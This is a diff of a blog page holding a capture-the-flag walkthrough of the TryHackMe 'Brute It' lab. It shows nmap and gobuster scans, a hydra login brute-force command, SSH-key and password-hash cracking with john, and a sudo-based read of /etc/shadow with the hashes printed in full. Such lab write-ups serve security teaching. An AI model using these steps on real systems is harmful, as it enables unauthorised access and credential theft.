@@ -1,246 +1,193 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto" data-theme="auto">
-
-<head><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
-<title>Brute It CTF Try Hack Me | Woahuh&#39;s site</title>
-<meta name="keywords" content="">
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Brute It CTF Try Hack Me :: Woahuh&#39;s site</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="Welcome to my first writeup! Today we will solve the Brute It CTF in Try Hack Me!
 First, lets go find some information on target&rsquo;s system with a nmap scan
-┌─[✗]─[woahuh@parrot]─[~]
-└──╼ $nmap -sV -Pn -A 10.48.188.61
-And then, we got this output
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 06:19 &#43;07
-Nmap scan report for 10.48.188.61 (10.48.188.61)
-Host is up (0.098s latency).
-Not shown: 998 closed tcp ports (conn-refused)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
-|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
-|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds
-As the output, we have 2 ports open, and thats the answer of question 1">
-<meta name="author" content="">
-<link rel="canonical" href="/writeups/brute-it-thm/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css" integrity="sha256-2jIR5e&#43;Ge/K3X9WmUVz&#43;1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as="style">
-<link rel="icon" href="/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-<link rel="apple-touch-icon" href="/apple-touch-icon.png">
-<link rel="mask-icon" href="/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="/writeups/brute-it-thm/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --theme: rgb(29, 30, 32);
-                --entry: rgb(46, 46, 51);
-                --primary: rgb(218, 218, 219);
-                --secondary: rgb(155, 156, 157);
-                --tertiary: rgb(65, 66, 68);
-                --content: rgb(196, 196, 197);
-                --code-block-bg: rgb(46, 46, 51);
-                --code-bg: rgb(55, 56, 62);
-                --border: rgb(51, 51, 51);
-                color-scheme: dark;
-            }
-
-            .list {
-                background: var(--theme);
-            }
-
-            .toc {
-                background: var(--entry);
-            }
-        }
-
-        @media (prefers-color-scheme: light) {
-            .list::-webkit-scrollbar-thumb {
-                border-color: var(--code-bg);
-            }
-        }
-
-    </style>
-</noscript>
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.querySelector("html").dataset.theme = 'dark';
-    } else if (localStorage.getItem("pref-theme") === "light") {
-       document.querySelector("html").dataset.theme = 'light';
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.querySelector("html").dataset.theme = 'dark';
-    } else {
-        document.querySelector("html").dataset.theme = 'light';
-    }
-
-</script><meta property="og:url" content="/writeups/brute-it-thm/">
-  <meta property="og:site_name" content="Woahuh&#39;s site">
-  <meta property="og:title" content="Brute It CTF Try Hack Me">
-  <meta property="og:description" content="Welcome to my first writeup! Today we will solve the Brute It CTF in Try Hack Me!
-First, lets go find some information on target’s system with a nmap scan
 ┌─[✗]─[woahuh@parrot]─[~] └──╼ $nmap -sV -Pn -A 10.48.188.61 And then, we got this output
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 06:19 &#43;07 Nmap scan report for 10.48.188.61 (10.48.188.61) Host is up (0.098s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA) | 256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA) |_ 256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds As the output, we have 2 ports open, and thats the answer of question 1">
-  <meta property="og:locale" content="en-us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2026-01-31T19:18:22+07:00">
-    <meta property="article:modified_time" content="2026-01-31T19:18:22+07:00">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Brute It CTF Try Hack Me">
-<meta name="twitter:description" content="Welcome to my first writeup! Today we will solve the Brute It CTF in Try Hack Me!
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 06:19 &#43;07 Nmap scan report for 10.48.188.61 (10.48.188.61) Host is up (0.098s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA) | 256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA) |_ 256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds As the output, we have 2 ports open, and thats the answer of question 1
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/writeups/brute-it-thm/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="//localhost:1313/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Brute It CTF Try Hack Me">
+<meta property="og:description" content="Welcome to my first writeup! Today we will solve the Brute It CTF in Try Hack Me!
 First, lets go find some information on target&rsquo;s system with a nmap scan
-┌─[✗]─[woahuh@parrot]─[~]
-└──╼ $nmap -sV -Pn -A 10.48.188.61
-And then, we got this output
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 06:19 &#43;07
-Nmap scan report for 10.48.188.61 (10.48.188.61)
-Host is up (0.098s latency).
-Not shown: 998 closed tcp ports (conn-refused)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
-|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
-|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+┌─[✗]─[woahuh@parrot]─[~] └──╼ $nmap -sV -Pn -A 10.48.188.61 And then, we got this output
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 06:19 &#43;07 Nmap scan report for 10.48.188.61 (10.48.188.61) Host is up (0.098s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA) | 256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA) |_ 256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds As the output, we have 2 ports open, and thats the answer of question 1
+" />
+<meta property="og:url" content="//localhost:1313/writeups/brute-it-thm/" />
+<meta property="og:site_name" content="Woahuh&#39;s site" />
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds
-As the output, we have 2 ports open, and thats the answer of question 1">
+  <meta property="og:image" content="//localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
 
 
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "Writeups",
-      "item": "/writeups/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  3 ,
-      "name": "Brute It CTF Try Hack Me",
-      "item": "/writeups/brute-it-thm/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "Brute It CTF Try Hack Me",
-  "name": "Brute It CTF Try Hack Me",
-  "description": "Welcome to my first writeup! Today we will solve the Brute It CTF in Try Hack Me!\nFirst, lets go find some information on target\u0026rsquo;s system with a nmap scan\n┌─[✗]─[woahuh@parrot]─[~] └──╼ $nmap -sV -Pn -A 10.48.188.61 And then, we got this output\nStarting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 06:19 +07 Nmap scan report for 10.48.188.61 (10.48.188.61) Host is up (0.098s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA) | 256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA) |_ 256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds As the output, we have 2 ports open, and thats the answer of question 1\n",
-  "keywords": [
-    
-  ],
-  "articleBody": "Welcome to my first writeup! Today we will solve the Brute It CTF in Try Hack Me!\nFirst, lets go find some information on target’s system with a nmap scan\n┌─[✗]─[woahuh@parrot]─[~] └──╼ $nmap -sV -Pn -A 10.48.188.61 And then, we got this output\nStarting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 06:19 +07 Nmap scan report for 10.48.188.61 (10.48.188.61) Host is up (0.098s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA) | 256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA) |_ 256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds As the output, we have 2 ports open, and thats the answer of question 1\nWe also can see that ssh is running on OpenSSH 7.6p1. And that is the answer for question 2\nWhen we take a closer look at port 80, we can see that it running Apache server and Apache is running on version 2.4.29\nAnd thats the answer of question 3\nNext to Apache version is the os it is running on, we can clearly see that it is Ubuntu. This is the answer of question 4\nWith the question 5, i used gobuster to brute force the directory\n┌─[✗]─[woahuh@parrot]─[~] └──╼ $gobuster dir -u http://10.48.188.61/ -w /usr/share/wordlists/rockyou.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.48.188.61/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/rockyou.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== Progress: 5347 / 14344393 (0.04%)[ERROR] parse \"http://10.48.188.61/!@#$%^\": invalid URL escape \"%^\" /***** (Status: 301) [Size: 312] [--\u003e http://10.48.188.61/*****/] Progress: 23190 / 14344393 (0.16%)[ERROR] parse \"http://10.48.188.61/!\\\"£$%^\": invalid URL escape \"%^\" Progress: 25015 / 14344393 (0.17%)[ERROR] parse \"http://10.48.188.61/!@#$%^\u0026*()\": invalid URL escape \"%^\u0026\" Progress: 27608 / 14344393 (0.19%)^C [!] Keyboard interrupt detected, terminating. Progress: 27612 / 14344393 (0.19%) =============================================================== Finished =============================================================== Lets go! We found the hidden directory, It is /admin. Now we can answer the last question in task 2\nNow, we have to brute force the password for website but lets see what is the username\nYay,the username is inside source code\nLets use hydra to crack the password\nhydra -l username-we-found -P /usr/share/wordlists/rockyou.txt 10.48.188.61 http-post-form '/path-we-found/:user=^USER^\u0026pass=^PASS^:f = invalid' -V i never cracked the password but i think you can !\nSo the answer for the first question in task 3 is admin:xavier\nAfter login, we have the web flag for question 4 in task 3\nThis is a rsa key, we have to crack it\nLets use ssh2john to turn this key to hash\n┌─[✗]─[woahuh@parrot]─[~] └──╼ $/usr/share/john/ssh2john.py key.txt After we got the hash (It is too long so i wont put it on here), we gonna use john to crack it\n┌─[woahuh@parrot]─[~] └──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt key.txt Lets go, we got the password\nUsing default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 12 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ********** (?) 1g 0:00:00:00 DONE (2026-02-01 07:22) 14.28g/s 1038Kp/s 1038Kc/s 1038KC/s saloni..punyaku Use the \"--show\" option to display all of the cracked passwords reliably Session completed. This is the answer for question 2\nNow, we have to ssh in target’s machine for user flag\n┌─[✗]─[woahuh@parrot]─[~] └──╼ $chmod 600 rsakey.txt Make sure the password file have permisson\n┌─[woahuh@parrot]─[~] └──╼ $ssh -i rsakey.txt john@10.48.188.61 ssh to target’s system\nEnter passphrase for key 'rsakey.txt': Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Feb 1 00:40:10 UTC 2026 System load: 0.0 Processes: 109 Usage of /: 25.7% of 19.56GB Users logged in: 0 Memory usage: 43% IP address for ens5: 10.48.188.61 Swap usage: 0% 63 packages can be updated. 0 updates are security updates. Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106 john@bruteit:~$ We got the user flag now! Lets answer the question 3 in task 3 with the flag\njohn@bruteit:~$ ls user.txt john@bruteit:~$ cat user.txt THM{a_password_is_not_a_barrier} john@bruteit:~$ Lets get root permisson now\njohn@bruteit:~$ sudo -l Matching Defaults entries for john on bruteit: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User john may run the following commands on bruteit: (root) NOPASSWD: /bin/cat As the output of ⁨sudo -l⁩, we can use cat as as root without password\nAfter running the cat command for /etc/shadow, we got the root hash, lets crack it\njohn@bruteit:~$ sudo cat /etc/shadow root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7::: daemon:*:18295:0:99999:7::: bin:*:18295:0:99999:7::: sys:*:18295:0:99999:7::: sync:*:18295:0:99999:7::: games:*:18295:0:99999:7::: man:*:18295:0:99999:7::: lp:*:18295:0:99999:7::: mail:*:18295:0:99999:7::: news:*:18295:0:99999:7::: uucp:*:18295:0:99999:7::: proxy:*:18295:0:99999:7::: www-data:*:18295:0:99999:7::: backup:*:18295:0:99999:7::: list:*:18295:0:99999:7::: irc:*:18295:0:99999:7::: gnats:*:18295:0:99999:7::: nobody:*:18295:0:99999:7::: systemd-network:*:18295:0:99999:7::: systemd-resolve:*:18295:0:99999:7::: syslog:*:18295:0:99999:7::: messagebus:*:18295:0:99999:7::: _apt:*:18295:0:99999:7::: lxd:*:18295:0:99999:7::: uuidd:*:18295:0:99999:7::: dnsmasq:*:18295:0:99999:7::: landscape:*:18295:0:99999:7::: pollinate:*:18295:0:99999:7::: thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7::: sshd:*:18489:0:99999:7::: john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7::: After use john to crack the hash, we got the root password now!\n┌─[woahuh@parrot]─[~] └──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 12 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ******** (?) 1g 0:00:00:00 DONE (2026-02-01 17:25) 3.448g/s 5296p/s 5296c/s 5296C/s 123456..mexico1 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. This is also the answer for question 1 task 4\nAnd for the last flag, here we go!\nroot@bruteit:~# ls root.txt root@bruteit:~# cat root.txt THM{****************} Thats also the finish of this room and writeup, thanks you for reading my writeup!\n",
-  "wordCount" : "958",
-  "inLanguage": "en",
-  "datePublished": "2026-01-31T19:18:22+07:00",
-  "dateModified": "2026-01-31T19:18:22+07:00",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "/writeups/brute-it-thm/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "Woahuh's site",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "/favicon.ico"
-    }
-  }
-}
-</script>
+  <meta property="article:published_time" content="2026-01-31 19:18:22 &#43;0700 &#43;07" />
+
+
+
+
+
+
+
+
+
+
+
+
 </head>
-<body id="top">
-    <header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="/" accesskey="h" title="Woahuh&#39;s site (Alt + H)">Woahuh&#39;s site</a>
-            <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                </button>
-            </div>
-        </div>
-        <ul id="menu">
-            <li>
-                <a href="/home" title="Home">
-                    <span>Home</span>
-                </a>
-            </li>
-            <li>
-                <a href="/blog/" title="Blogs">
-                    <span>Blogs</span>
-                </a>
-            </li>
-            <li>
-                <a href="/writeups/" title="Writeups">
-                    <span>Writeups</span>
-                </a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<main class="main">
+<body>
 
-<article class="post-single">
-  <header class="post-header">
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Woahuh@site
+  </div>
+</a>
+
+    </div>
     
-    <h1 class="post-title entry-hint-parent">
-      Brute It CTF Try Hack Me
-    </h1>
-    <div class="post-meta"><span title='2026-01-31 19:18:22 +0700 +07'>January 31, 2026</span>
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/">Home</a></li>
+        
+      
+        
+          <li><a href="/blog/">Blogs</a></li>
+        
+      
+        
+          <li><a href="/writeups/">Writeups</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
 
-</div>
-  </header> 
-  <div class="post-content"><p>Welcome to my first writeup! Today we will solve the Brute It CTF in Try Hack Me!</p>
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/" >Home</a></li>
+        
+      
+        
+          <li><a href="/blog/" >Blogs</a></li>
+        
+      
+        
+          <li><a href="/writeups/" >Writeups</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/writeups/brute-it-thm/">Brute It CTF Try Hack Me</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2026-01-31</time><span class="post-reading-time">5 min read (958 words)</span></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Welcome to my first writeup! Today we will solve the Brute It CTF in Try Hack Me!</p>
 <p>First, lets go find some information on target&rsquo;s system with a nmap scan</p>
 <pre tabindex="0"><code>┌─[✗]─[woahuh@parrot]─[~]
 └──╼ $nmap -sV -Pn -A 10.48.188.61
@@ -298,15 +245,15 @@ Finished
 </code></pre><p>Lets go! We found the hidden directory, It is <strong>/admin</strong>. Now we can answer the last question in task 2</p>
 <p>Now, we have to brute force the password for website but lets see what is the username</p>
 <p>Yay,the username is inside source code</p>
-<p><img alt="Source code" loading="lazy" src="/images/brute-it/source-code-bruteit.webp"></p>
+<p><img src="/images/brute-it/source-code-bruteit.webp" alt="Source code"></p>
 <p>Lets use hydra to crack the password</p>
 <pre tabindex="0"><code>hydra -l username-we-found -P /usr/share/wordlists/rockyou.txt 10.48.188.61 http-post-form &#39;/path-we-found/:user=^USER^&amp;pass=^PASS^:f = invalid&#39; -V
 </code></pre><p>i never cracked the password but i think you can !</p>
 <p>So the answer for the first question in task 3 is <strong>admin:xavier</strong></p>
 <p>After login, we have the web flag for question 4 in task 3</p>
-<p><img alt="The flag" loading="lazy" src="/images/brute-it/flag-img-bruteit.webp"></p>
+<p><img src="/images/brute-it/flag-img-bruteit.webp" alt="The flag"></p>
 <p>This is a rsa key, we have to crack it</p>
-<p><img alt="RSA key" loading="lazy" src="/images/brute-it/rsa-key-bruteit.webp"></p>
+<p><img src="/images/brute-it/rsa-key-bruteit.webp" alt="RSA key"></p>
 <p>Lets use ssh2john to turn this key to hash</p>
 <pre tabindex="0"><code>┌─[✗]─[woahuh@parrot]─[~]
 └──╼ $/usr/share/john/ssh2john.py key.txt
@@ -421,91 +368,43 @@ root@bruteit:~# cat root.txt
 THM{****************}
 </code></pre><p>Thats also the finish of this room and writeup, thanks you for reading my writeup!</p>
 
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
 
   </div>
 
-  <footer class="post-footer">
-    <ul class="post-tags">
-    </ul>
-  </footer>
-</article>
-    </main>
+  
+    <footer class="footer">
+  <div class="footer__inner">
     
-<footer class="footer">
-        <span>&copy; 2026 <a href="/">Woahuh&#39;s site</a></span> · 
-
-    <span>
-        Powered by
-        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
-        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
-    </span>
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
 </footer>
-<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
-    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
-        <path d="M12 6H0l6-6z" />
-    </svg>
-</a>
 
-<script>
-    let menu = document.getElementById('menu');
-    if (menu) {
-        
-        const scrollPosition = localStorage.getItem("menu-scroll-position");
-        if (scrollPosition) {
